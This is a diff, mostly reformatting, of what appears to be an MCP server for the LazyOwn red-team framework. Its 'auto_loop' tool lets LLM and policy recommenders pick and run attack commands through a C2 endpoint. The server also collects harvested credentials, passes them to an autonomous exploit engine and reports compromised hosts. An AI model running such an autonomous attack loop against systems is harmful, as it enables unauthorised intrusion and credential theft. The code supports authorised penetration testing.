+                        f"  [{ev.get('type', '?')}] {str(p.get('command') or p.get('objective') or p.get('phase') or '')[:60]}"
+                    )
             except Exception as e:
                 lines.append(f"[AUTO EVENTS] error: {e}")
 
@@ -7289,7 +7530,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 with open(str(csv_file), newline="", errors="replace") as f:
                     rows = list(_csv.DictReader(f))
                 total = len(rows)
-                cmds = set(r.get("command","") for r in rows)
+                cmds = set(r.get("command", "") for r in rows)
                 lines.append(f"\n[SESSION CSV] {total} command rows, {len(cmds)} unique commands")
             except Exception as e:
                 lines.append(f"[SESSION CSV] error: {e}")
@@ -7302,13 +7543,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 try:
                     wm = json.loads(wm_file.read_text())
                     from modules.killchain import KillChain
+
                     sitrep_struct["world_model"] = {
                         "phase": KillChain.current_phase(world_model_path=wm_file),
                         "host_count": len(wm.get("hosts", {})),
                         "credentials": [
-                            {**c,
-                             "is_likely_credential": is_likely_credential(str(c.get("value", "")))[0],
-                             "confidence": is_likely_credential(str(c.get("value", "")))[1]}
+                            {
+                                **c,
+                                "is_likely_credential": is_likely_credential(str(c.get("value", "")))[0],
+                                "confidence": is_likely_credential(str(c.get("value", "")))[1],
+                            }
                             for c in wm.get("credentials", [])[:50]
                         ],
                         "hosts": wm.get("hosts", {}),
@@ -7326,11 +7570,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             cred_paths = sorted(SESSIONS_DIR.glob("credentials*.txt"))
             for cp in cred_paths[:10]:
                 try:
-                    sitrep_struct["credentials_files"].append({
-                        "name": cp.name,
-                        "preview": cp.read_text(errors="replace")[:240],
-                        "freshness": evidence_freshness(cp),
-                    })
+                    sitrep_struct["credentials_files"].append(
+                        {
+                            "name": cp.name,
+                            "preview": cp.read_text(errors="replace")[:240],
+                            "freshness": evidence_freshness(cp),
+                        }
+                    )
                 except OSError:
                     pass
 
@@ -7345,9 +7591,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         "total": len(tdata),
                         "by_status": by_status,
                         "pending_preview": [
-                            {"id": t.get("id"), "status": t.get("status"),
-                             "title": t.get("title", "")[:140]}
-                            for t in tdata if t.get("status") != "Done"
+                            {"id": t.get("id"), "status": t.get("status"), "title": t.get("title", "")[:140]}
+                            for t in tdata
+                            if t.get("status") != "Done"
                         ][:20],
                     }
                 except Exception as exc:
@@ -7443,10 +7689,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         report_file = LAZYOWN_DIR / "static" / "body_report.json"
         action = arguments.get("action", "read")
         REPORT_FIELDS = [
-            "assessment_information", "engagement_overview", "service_description",
-            "campaign_objectives", "process_and_methodology", "scoping_and_rules",
-            "executive_summary_findings", "executive_summary_narrative",
-            "summary_vulnerability_overview", "security_labs_toolkit", "appendix_a_changes",
+            "assessment_information",
+            "engagement_overview",
+            "service_description",
+            "campaign_objectives",
+            "process_and_methodology",
+            "scoping_and_rules",
+            "executive_summary_findings",
+            "executive_summary_narrative",
+            "summary_vulnerability_overview",
+            "security_labs_toolkit",
+            "appendix_a_changes",
         ]
         try:
             body = json.loads(report_file.read_text()) if report_file.exists() else {}
@@ -7481,7 +7734,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     owned = [ip for ip, h in hosts.items() if h.get("state") in ("exploited", "owned")]
                     scanned = [ip for ip, h in hosts.items() if h.get("state") == "scanned"]
                     creds = wm.get("credentials", [])
-                    summary_parts.append(f"Hosts discovered: {len(hosts)} | Compromised: {len(owned)} | Scanned only: {len(scanned)}")
+                    summary_parts.append(
+                        f"Hosts discovered: {len(hosts)} | Compromised: {len(owned)} | Scanned only: {len(scanned)}"
+                    )
                     if owned:
                         summary_parts.append(f"Compromised hosts: {', '.join(owned)}")
                     if creds:
@@ -7501,7 +7756,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 try:
                     lessons = [json.loads(line) for line in lessons_file.read_text().splitlines() if line.strip()]
                     for les in lessons[-5:]:
-                        summary_parts.append(f"- [{les.get('topic','?')}] {les.get('lesson','')[:100]}")
+                        summary_parts.append(f"- [{les.get('topic', '?')}] {les.get('lesson', '')[:100]}")
                 except Exception:
                     pass
             auto_text = "\n".join(summary_parts) or "(insufficient session data)"
@@ -7524,22 +7779,23 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         except Exception as e:
             return text(f"Error reading lessons: {e}")
         if topic_filter:
-            lessons = [lesson for lesson in lessons if lesson.get("topic","") == topic_filter]
+            lessons = [lesson for lesson in lessons if lesson.get("topic", "") == topic_filter]
         lessons = lessons[-last_n:]
         if not lessons:
             return text(f"No lessons found{' for topic=' + topic_filter if topic_filter else ''}.")
         lines = [f"Campaign lessons ({len(lessons)} entries):", ""]
         for les in lessons:
             lines.append(
-                f"[{les.get('campaign_name','?')}] [{les.get('topic','?')}] {les.get('derived_at','')[:10]}\n"
-                f"  {les.get('lesson','')}\n"
-                f"  ctx: {les.get('context','')}\n"
+                f"[{les.get('campaign_name', '?')}] [{les.get('topic', '?')}] {les.get('derived_at', '')[:10]}\n"
+                f"  {les.get('lesson', '')}\n"
+                f"  ctx: {les.get('context', '')}\n"
             )
         return text("\n".join(lines))
 
     # ── auto_populate ─────────────────────────────────────────────────────────
     elif name == "lazyown_auto_populate":
         import xml.etree.ElementTree as _ET
+
         force_overwrite = bool(arguments.get("force", False))
         payload_file = LAZYOWN_DIR / "payload.json"
         try:
@@ -7634,35 +7890,37 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         # Pretty-print key sections
         hosts_lines = []
         for ip, info in state.get("hosts", {}).items():
-            ports  = info.get("ports", [])
+            ports = info.get("ports", [])
             domain = info.get("domain", "")
             active = " ◄ active" if info.get("is_active") else ""
             hosts_lines.append(
-                f"  {ip}" + (f" ({domain})" if domain else "") +
-                (f"  ports:{ports}" if ports else "") + active
+                f"  {ip}" + (f" ({domain})" if domain else "") + (f"  ports:{ports}" if ports else "") + active
             )
         pending = state.get("pending_events", [])
-        ev_lines = [
-            f"  [{e['severity'].upper()}] {e['type']}  — {e['suggest'][:70]}"
-            for e in pending
-        ]
-        output = "\n".join([
-            f"Phase:          {state['phase']}",
-            f"Active target:  {state['active_target']}  (os: {state['os_target']})",
-            f"Domain:         {state['domain'] or 'unknown'}",
-            f"Lhost:          {state['lhost']}",
-            "",
-            f"Hosts ({len(state['hosts'])}):",
-        ] + (hosts_lines or ["  (none)"]) + [
-            "",
-            f"Credentials:    {state['credentials'] or ['none']}",
-            f"Last commands:  {', '.join(state['last_commands'][-6:]) or 'none'}",
-            "",
-            f"Pending events ({state['open_event_count']}):",
-        ] + (ev_lines or ["  (none)"]) + [
-            "",
-            f"Generated: {state['generated_at'][:19]}",
-        ])
+        ev_lines = [f"  [{e['severity'].upper()}] {e['type']}  — {e['suggest'][:70]}" for e in pending]
+        output = "\n".join(
+            [
+                f"Phase:          {state['phase']}",
+                f"Active target:  {state['active_target']}  (os: {state['os_target']})",
+                f"Domain:         {state['domain'] or 'unknown'}",
+                f"Lhost:          {state['lhost']}",
+                "",
+                f"Hosts ({len(state['hosts'])}):",
+            ]
+            + (hosts_lines or ["  (none)"])
+            + [
+                "",
+                f"Credentials:    {state['credentials'] or ['none']}",
+                f"Last commands:  {', '.join(state['last_commands'][-6:]) or 'none'}",
+                "",
+                f"Pending events ({state['open_event_count']}):",
+            ]
+            + (ev_lines or ["  (none)"])
+            + [
+                "",
+                f"Generated: {state['generated_at'][:19]}",
+            ]
+        )
         return text(output)
 
     # ── command_prev ──────────────────────────────────────────────────────────
@@ -7692,16 +7950,20 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         limit = arguments.get("limit") or 5
         chain = CommandChain()
         steps = chain.next(cmd=verb, params=cfg, target=target, phase=phase, limit=limit)
-        return text(json.dumps({
-            "command": verb,
-            "target": target,
-            "phase": phase,
-            "next": [step.to_dict() for step in steps],
-        }))
+        return text(
+            json.dumps(
+                {
+                    "command": verb,
+                    "target": target,
+                    "phase": phase,
+                    "next": [step.to_dict() for step in steps],
+                }
+            )
+        )
 
     # ── recommend_next ────────────────────────────────────────────────────────
     elif name == "lazyown_recommend_next":
-        cfg    = _load_payload()
+        cfg = _load_payload()
         target = cfg.get("rhost", "") or cfg.get("lhost", "127.0.0.1")
         lines: list[str] = []
 
@@ -7719,10 +7981,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 for i, rec in enumerate(recs, 1):
                     bar = "█" * int(min(rec.score, 1.0) * 10)
                     tag = "category" if rec.kind == KIND_CATEGORY else rec.kind
-                    out.append(
-                        f"  {i}. [{bar:<10}] {rec.action}  "
-                        f"[{tag} · {', '.join(rec.sources)}]"
-                    )
+                    out.append(f"  {i}. [{bar:<10}] {rec.action}  [{tag} · {', '.join(rec.sources)}]")
                     for reason in rec.reasons:
                         out.append(f"       {reason}")
                     if rec.command_preview:
@@ -7730,27 +7989,21 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 out.append("")
             return out
 
-        lines.extend(
-            await asyncio.get_event_loop().run_in_executor(None, _fused_recommendations)
-        )
+        lines.extend(await asyncio.get_event_loop().run_in_executor(None, _fused_recommendations))
 
         # Layer 2 — LLM recommender: specific commands with arguments
         if _RECOMMENDER_AVAILABLE:
             api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
-            llm_recs = await asyncio.get_event_loop().run_in_executor(
-                None, lambda: _recommend(api_key)
-            )
-            if llm_recs and not (
-                len(llm_recs) == 1 and llm_recs[0].get("command") in ("_error", "_unavailable")
-            ):
+            llm_recs = await asyncio.get_event_loop().run_in_executor(None, lambda: _recommend(api_key))
+            if llm_recs and not (len(llm_recs) == 1 and llm_recs[0].get("command") in ("_error", "_unavailable")):
                 via = llm_recs[0].get("_via", "")
                 header = "[LLM] Specific commands"
                 if via:
                     header += f" (via {via})"
                 lines.append(header + ":")
                 for i, r in enumerate(llm_recs, 1):
-                    bar  = "█" * int(r["confidence"] * 10)
-                    cmd  = r["command"]
+                    bar = "█" * int(r["confidence"] * 10)
+                    cmd = r["command"]
                     args = f" {r['args']}" if r.get("args") else ""
                     lines.append(f"  {i}. [{bar:<10}] {r['confidence']:.0%}  {cmd}{args}")
                     lines.append(f"       {r['reason']}")
@@ -7764,8 +8017,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_timeline":
         if not _ensure_narrator():
             return text("Timeline narrator not available — check modules/timeline_narrator.py")
-        force   = arguments.get("force", False)
-        cfg     = _load_payload()
+        force = arguments.get("force", False)
+        cfg = _load_payload()
         api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
         # No api_key and not force → try cache first
         if not api_key and not force:
@@ -7773,9 +8026,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if cached:
                 return text(cached)
         # ai_fallback handles missing key / quota / Ollama fallback internally
-        result = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _narrate(api_key=api_key, force=force)
-        )
+        result = await asyncio.get_event_loop().run_in_executor(None, lambda: _narrate(api_key=api_key, force=force))
         return text(result)
 
     # ── c2_vuln_analysis ──────────────────────────────────────────────────────
@@ -7832,18 +8083,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_policy_status":
         _ensure_policy()
         if not _POLICY_AVAILABLE or _policy is None:
-            return text(
-                "Policy engine unavailable. "
-                "Run: python3 skills/lazyown_policy.py bootstrap"
-            )
-        cfg    = _load_payload()
+            return text("Policy engine unavailable. Run: python3 skills/lazyown_policy.py bootstrap")
+        cfg = _load_payload()
         target = arguments.get("target") or cfg.get("rhost", "") or "127.0.0.1"
-        summary = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _policy._advisor.episode_summary(target)
-        )
-        recs = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _policy.get_recommendations(target)
-        )
+        summary = await asyncio.get_event_loop().run_in_executor(None, lambda: _policy._advisor.episode_summary(target))
+        recs = await asyncio.get_event_loop().run_in_executor(None, lambda: _policy.get_recommendations(target))
         lines: list[str] = []
         if summary:
             lines.append(
@@ -7853,17 +8097,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 f"last_state={summary['last_state']}"
             )
         else:
-            lines.append(
-                f"No episode data for {target}. "
-                "Run bootstrap or execute commands first."
-            )
+            lines.append(f"No episode data for {target}. Run bootstrap or execute commands first.")
         lines.append("\nRecommendations:")
         for i, r in enumerate(recs, 1):
             bar = "█" * int(r["confidence"] * 10)
-            lines.append(
-                f"  {i}. [{bar:<10}] {r['confidence']:.0%}  "
-                f"category={r['category']}  [{r['source']}]"
-            )
+            lines.append(f"  {i}. [{bar:<10}] {r['confidence']:.0%}  category={r['category']}  [{r['source']}]")
             lines.append(f"       {r['reason']}")
         return text("\n".join(lines))
 
@@ -7871,19 +8109,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_auto_loop":
         _ensure_policy()
         if not _POLICY_AVAILABLE or _policy is None:
-            return text(
-                "Policy engine unavailable. "
-                "Run: python3 skills/lazyown_policy.py bootstrap"
-            )
-        cfg              = _load_payload()
-        target           = arguments.get("target") or cfg.get("rhost", "") or "127.0.0.1"
-        max_steps        = min(int(arguments.get("max_steps", 5)), 20)
-        stop_on_high     = bool(arguments.get("stop_on_high_value_success", True))
-        step_timeout     = int(arguments.get("step_timeout_s", 60))
-        step_delay       = int(arguments.get("step_delay_s", 3))
-        run_bootstrap    = arguments.get("bootstrap", True)
-        cat_map          = _load_category_command_map()
-        high_value_cats  = {"intrusion", "privesc", "credential"}
+            return text("Policy engine unavailable. Run: python3 skills/lazyown_policy.py bootstrap")
+        cfg = _load_payload()
+        target = arguments.get("target") or cfg.get("rhost", "") or "127.0.0.1"
+        max_steps = min(int(arguments.get("max_steps", 5)), 20)
+        stop_on_high = bool(arguments.get("stop_on_high_value_success", True))
+        step_timeout = int(arguments.get("step_timeout_s", 60))
+        step_delay = int(arguments.get("step_delay_s", 3))
+        run_bootstrap = arguments.get("bootstrap", True)
+        cat_map = _load_category_command_map()
+        high_value_cats = {"intrusion", "privesc", "credential"}
 
         # --- OpenClaw-style world model + observation parser ---
         _wm = None
@@ -7892,6 +8127,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from obs_parser import ObsParser
             from world_model import WorldModel
+
             _wm = WorldModel()
             _obs_parser = ObsParser()
         except Exception:
@@ -7903,7 +8139,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         # Commands blocked by stuck-loop recovery (matched by base name)
         _blocked_cmds: set[str] = set()
         # Reactive engine — carries the highest-priority decision across steps
-        _reactive_state: dict[str, str] = {}   # keys: "cmd", "args", "reason", "mitre"
+        _reactive_state: dict[str, str] = {}  # keys: "cmd", "args", "reason", "mitre"
         # Bootstrap log — records the deterministic pre-flight steps
         _bootstrap_log: list[dict] = []
 
@@ -7926,6 +8162,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             Polls every 15 seconds; nmap on a /24 can take 20-30 min.
             """
             import glob as _glob
+
             deadline = time.time() + timeout_s
             while time.time() < deadline:
                 exact = SESSIONS_DIR / f"scan_{tgt}.nmap.xml"
@@ -7953,20 +8190,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             nmap_path = SESSIONS_DIR / f"scan_{tgt}.nmap"
             if nmap_path.exists():
                 try:
-                    evidence_parts.append(
-                        f"=== NMAP SCAN ({tgt}) ===\n"
-                        + nmap_path.read_text(errors="replace")[:4000]
-                    )
+                    evidence_parts.append(f"=== NMAP SCAN ({tgt}) ===\n" + nmap_path.read_text(errors="replace")[:4000])
                 except Exception:
                     pass
 
             vuln_path = SESSIONS_DIR / f"vulns_{tgt}.nmap"
             if vuln_path.exists():
                 try:
-                    evidence_parts.append(
-                        "=== VULN SCRIPTS ===\n"
-                        + vuln_path.read_text(errors="replace")[:2000]
-                    )
+                    evidence_parts.append("=== VULN SCRIPTS ===\n" + vuln_path.read_text(errors="replace")[:2000])
                 except Exception:
                     pass
 
@@ -7984,9 +8215,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             cred_globs = list((SESSIONS_DIR).glob("credentials*.txt"))
             for cp in cred_globs[:2]:
                 try:
-                    evidence_parts.append(
-                        f"=== CREDENTIALS ===\n{cp.read_text(errors='replace')[:500]}"
-                    )
+                    evidence_parts.append(f"=== CREDENTIALS ===\n{cp.read_text(errors='replace')[:500]}")
                 except Exception:
                     pass
 
@@ -8012,6 +8241,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if api_key:
                 try:
                     from modules.llm_client import LLMClient as _LLMC
+
                     _llm = _LLMC(api_key=api_key)
                     raw = _llm.ask(
                         prompt,
@@ -8020,9 +8250,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         temperature=0.1,
                     )
                     import re as _re
-                    jm = _re.search(r'\[.*\]', raw, _re.DOTALL)
+
+                    jm = _re.search(r"\[.*\]", raw, _re.DOTALL)
                     if jm:
                         import uuid as _uuid
+
                         candidates = json.loads(jm.group())
                         for t in candidates:
                             if isinstance(t, dict) and t.get("title") and t.get("command"):
@@ -8122,11 +8354,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             _run_lazyown_command("ping", step_timeout)
             os_info = _read_os_json()
             platform = os_info.get("os", "Unknown")
-            steps.append({
-                "bootstrap_step": "ping",
-                "platform": platform,
-                "outcome": "success" if os_info else "unknown",
-            })
+            steps.append(
+                {
+                    "bootstrap_step": "ping",
+                    "platform": platform,
+                    "outcome": "success" if os_info else "unknown",
+                }
+            )
 
             # Step 2 — lazynmap (fire-and-wait)
             print(f"[bootstrap] Step 2/4: lazynmap {target}", flush=True)
@@ -8146,11 +8380,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             # Step 4 — LLM task generation
             print("[bootstrap] Step 4/4: generating tasks.json from sessions", flush=True)
             new_tasks = _generate_tasks_from_sessions(target, platform, _api_key)
-            steps.append({
-                "bootstrap_step": "task_generation",
-                "tasks_created": len(new_tasks),
-                "titles": [t.get("title", "") for t in new_tasks[:5]],
-            })
+            steps.append(
+                {
+                    "bootstrap_step": "task_generation",
+                    "tasks_created": len(new_tasks),
+                    "titles": [t.get("title", "") for t in new_tasks[:5]],
+                }
+            )
 
             return steps
 
@@ -8162,9 +8398,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if _pdb is None:
                 return []
             try:
-                rows = _pdb.query_session(
-                    phase=category, target=tgt, success_only=True, limit=50
-                )
+                rows = _pdb.query_session(phase=category, target=tgt, success_only=True, limit=50)
                 freq: dict[str, int] = {}
                 for r in rows:
                     cmd = (r.get("command") or "").strip()
@@ -8183,20 +8417,26 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             xml_pattern = SESSIONS_DIR / f"scan_{tgt}.nmap.xml"
             if not xml_pattern.exists():
                 import glob as _glob
+
                 matches = _glob.glob(str(SESSIONS_DIR / f"scan_*{tgt}*.nmap.xml"))
                 if not matches:
                     return "no xml found for pwntomate"
                 xml_pattern = Path(matches[0])
             try:
                 import subprocess as _sp
+
                 result = _sp.run(
                     [
-                        sys.executable, "-W", "ignore",
+                        sys.executable,
+                        "-W",
+                        "ignore",
                         str(LAZYOWN_DIR / "pwntomate.py"),
                         str(xml_pattern),
                         "-x",
-                        "-b", str(SESSIONS_DIR),
-                        "-t", str(LAZYOWN_DIR / "tools"),
+                        "-b",
+                        str(SESSIONS_DIR),
+                        "-t",
+                        str(LAZYOWN_DIR / "tools"),
                     ],
                     capture_output=True,
                     text=True,
@@ -8258,14 +8498,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             pending_task = _next_pending_task()
             if pending_task:
                 _active_task = pending_task
-                task_cmd   = pending_task.get("command", "").strip()
+                task_cmd = pending_task.get("command", "").strip()
                 task_parts = task_cmd.split(None, 1)
-                t_cmd  = task_parts[0] if task_parts else task_cmd
+                t_cmd = task_parts[0] if task_parts else task_cmd
                 t_args = task_parts[1] if len(task_parts) > 1 else ""
                 pending_task.get("phase", "enum")
 
                 full_cmd = f"{t_cmd} {t_args}".strip()
-                print(f"[auto_loop] task '{pending_task.get('title','?')}' → {full_cmd}", flush=True)
+                print(f"[auto_loop] task '{pending_task.get('title', '?')}' → {full_cmd}", flush=True)
                 c2_result = _c2_request("/api/run", method="POST", body={"command": full_cmd})
                 if "_error" in c2_result or "error" in c2_result:
                     output = _run_lazyown_command(full_cmd, step_timeout)
@@ -8287,12 +8527,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 if output and output.strip():
                     try:
                         import re as _re_rag
+
                         _safe = _re_rag.sub(r"[^a-zA-Z0-9_-]", "_", t_cmd)[:40]
                         _odir = SESSIONS_DIR / "auto_loop_outputs"
                         _odir.mkdir(parents=True, exist_ok=True)
-                        (_odir / f"{int(time.time())}_{_safe}.txt").write_text(
-                            output[:8000], errors="replace"
-                        )
+                        (_odir / f"{int(time.time())}_{_safe}.txt").write_text(output[:8000], errors="replace")
                     except Exception:
                         pass
 
@@ -8301,6 +8540,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         obs = _obs_parser.parse(output, host=target, tool=t_cmd)
                         _wm.update_from_findings(obs.findings)
                         from modules.intelligence_engine import get_intelligence_engine
+
                         ie = get_intelligence_engine()
                         ie.collect_from_tool(output, tool=t_cmd, host=target)
                         cred_findings = obs.by_type("credential")
@@ -8308,14 +8548,28 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         if cred_findings or hash_findings:
                             try:
                                 from modules.autonomous_exploit_engine import AutonomousExploitEngine
+
                                 _PLACEHOLDER_PATTERNS = (
-                                    "CHANGE_ME", "CHANGEME", "YOUR_API_KEY_HERE",
-                                    "admin", "root", "user", "password", "pass",
-                                    "test", "guest", "anonymous",
+                                    "CHANGE_ME",
+                                    "CHANGEME",
+                                    "YOUR_API_KEY_HERE",
+                                    "admin",
+                                    "root",
+                                    "user",
+                                    "password",
+                                    "pass",
+                                    "test",
+                                    "guest",
+                                    "anonymous",
                                 )
+
                                 def _is_placeholder(val: str) -> bool:
                                     lower = val.lower().strip()
-                                    return any(p.lower() in lower for p in _PLACEHOLDER_PATTERNS if len(p) > 5) or lower in _PLACEHOLDER_PATTERNS
+                                    return (
+                                        any(p.lower() in lower for p in _PLACEHOLDER_PATTERNS if len(p) > 5)
+                                        or lower in _PLACEHOLDER_PATTERNS
+                                    )
+
                                 engine = AutonomousExploitEngine.get_instance()
                                 creds: list[dict[str, str]] = []
                                 for cf in cred_findings:
@@ -8338,22 +8592,18 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     except Exception:
                         pass
 
-                should_stop = (
-                    stop_on_high
-                    and step_rec.outcome == "success"
-                    and step_rec.category in high_value_cats
-                )
+                should_stop = stop_on_high and step_rec.outcome == "success" and step_rec.category in high_value_cats
                 return {
                     "stop": should_stop,
                     "step": {
-                        "command":    full_cmd,
-                        "category":   step_rec.category,
-                        "outcome":    step_rec.outcome,
-                        "reward":     step_rec.reward,
+                        "command": full_cmd,
+                        "category": step_rec.category,
+                        "outcome": step_rec.outcome,
+                        "reward": step_rec.reward,
                         "confidence": step_rec.confidence,
-                        "via":        via,
-                        "policy_rec": f"task:{pending_task.get('title','?')}",
-                        "source":     "tasks.json",
+                        "via": via,
+                        "policy_rec": f"task:{pending_task.get('title', '?')}",
+                        "source": "tasks.json",
                     },
                 }
 
@@ -8381,7 +8631,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             # 0. Reactive engine: consume the top decision injected by the previous step
             if _reactive_state.get("cmd"):
                 _r_parts = _reactive_state["cmd"].split(None, 1)
-                resolved_cmd  = _r_parts[0]
+                resolved_cmd = _r_parts[0]
                 resolved_args = _r_parts[1] if len(_r_parts) > 1 else _reactive_state.get("args", "")
                 _reactive_state.clear()
 
@@ -8401,6 +8651,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if not resolved_cmd:
                 try:
                     from lazyown_bridge import get_dispatcher as _get_bridge
+
                     _bridge = _get_bridge()
                     # Use policy-recommended category for bridge lookup.
                     # WorldModel phase lags behind (stays at 'scanning' until
@@ -8413,14 +8664,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         _wm_snap = _wm.snapshot()
                         _host_info = _wm_snap.get("hosts", {}).get(target, {})
                         _svcs = _host_info.get("services", {})
-                        _services = [
-                            f"{v.get('name','')}" for v in _svcs.values()
-                            if isinstance(v, dict)
-                        ]
+                        _services = [f"{v.get('name', '')}" for v in _svcs.values() if isinstance(v, dict)]
                         _has_creds_wm = bool(_wm_snap.get("credentials"))
                     _excl_set = {
-                        k.split(":")[-1] for k, v in _fail_counts.items()
-                        if k.startswith(f"{target}:") and v >= 2
+                        k.split(":")[-1] for k, v in _fail_counts.items() if k.startswith(f"{target}:") and v >= 2
                     }
                     _bridge_result = _bridge.suggest(
                         phase=_phase_val,
@@ -8433,9 +8680,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     if _bridge_result is not None:
                         _bridge_cmd, _bridge_entry = _bridge_result
                         _bridge_parts = _bridge_cmd.split(None, 1)
-                        _bridge_base  = _bridge_parts[0]
+                        _bridge_base = _bridge_parts[0]
                         if _bridge_base not in _blocked_cmds:
-                            resolved_cmd  = _bridge_base
+                            resolved_cmd = _bridge_base
                             resolved_args = _bridge_parts[1] if len(_bridge_parts) > 1 else ""
                 except Exception:
                     pass
@@ -8445,12 +8692,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
                 try:
                     llm_recs = _recommend(api_key)
-                    for lr in (llm_recs or []):
+                    for lr in llm_recs or []:
                         cmd_cand = lr.get("command", "")
                         fail_key = f"{target}:{category}:{cmd_cand}"
-                        if cmd_cand not in ("_error", "_unavailable") and \
-                                _fail_counts.get(fail_key, 0) < 2:
-                            resolved_cmd  = cmd_cand
+                        if cmd_cand not in ("_error", "_unavailable") and _fail_counts.get(fail_key, 0) < 2:
+                            resolved_cmd = cmd_cand
                             resolved_args = lr.get("args", "")
                             break
                 except Exception:
@@ -8460,22 +8706,19 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if not resolved_cmd:
                 fallback = cat_map.get(category, "list")
                 fail_key = f"{target}:{category}:{fallback}"
-                resolved_cmd = (
-                    fallback if _fail_counts.get(fail_key, 0) < 2 else "list"
-                )
+                resolved_cmd = fallback if _fail_counts.get(fail_key, 0) < 2 else "list"
 
             # Enrich args with FactStore context when no explicit args were given
-            resolved_cmd, resolved_args = _build_command_from_facts(
-                category, resolved_cmd, resolved_args, target
-            )
+            resolved_cmd, resolved_args = _build_command_from_facts(category, resolved_cmd, resolved_args, target)
 
             # --- RAG context injection (OpenClaw style) ---
             _rag_context = ""
             try:
                 sys.path.insert(0, str(MODULES_DIR))
                 from session_rag import get_rag as _get_rag_auto
+
                 _rag_auto = _get_rag_auto()
-                _rag_auto.index_new()   # incremental — fast, no-op if nothing changed
+                _rag_auto.index_new()  # incremental — fast, no-op if nothing changed
                 _rag_context = _rag_auto.context_for_step(
                     phase=_wm.get_phase().value if _wm is not None else category,
                     target=target,
@@ -8507,6 +8750,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         f'"confidence": 0.0}}'
                     )
                     from modules.llm_client import LLMClient as _LLMC
+
                     _llm = _LLMC(api_key=_api_key)
                     _raw_thought = _llm.ask(
                         _thought_prompt,
@@ -8515,7 +8759,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         temperature=0.1,
                     )
                     import re as _re
-                    _jm = _re.search(r'\{.*\}', _raw_thought, _re.DOTALL)
+
+                    _jm = _re.search(r"\{.*\}", _raw_thought, _re.DOTALL)
                     if _jm:
                         _tj = json.loads(_jm.group())
                         _thought = _tj.get("thought", "")
@@ -8550,13 +8795,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if output and output.strip():
                 try:
                     import re as _re_rag
+
                     _safe_cmd = _re_rag.sub(r"[^a-zA-Z0-9_-]", "_", resolved_cmd)[:40]
-                    _out_dir  = SESSIONS_DIR / "auto_loop_outputs"
+                    _out_dir = SESSIONS_DIR / "auto_loop_outputs"
                     _out_dir.mkdir(parents=True, exist_ok=True)
-                    _out_ts   = int(time.time())
-                    (_out_dir / f"{_out_ts}_{_safe_cmd}.txt").write_text(
-                        output[:8000], errors="replace"
-                    )
+                    _out_ts = int(time.time())
+                    (_out_dir / f"{_out_ts}_{_safe_cmd}.txt").write_text(output[:8000], errors="replace")
                 except Exception:
                     pass
 
@@ -8566,6 +8810,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     obs = _obs_parser.parse(output, host=target, tool=resolved_cmd)
                     _wm.update_from_findings(obs.findings)
                     from modules.intelligence_engine import get_intelligence_engine
+
                     ie = get_intelligence_engine()
                     ie.collect_from_tool(output, tool=resolved_cmd, host=target)
                     cred_findings = obs.by_type("credential")
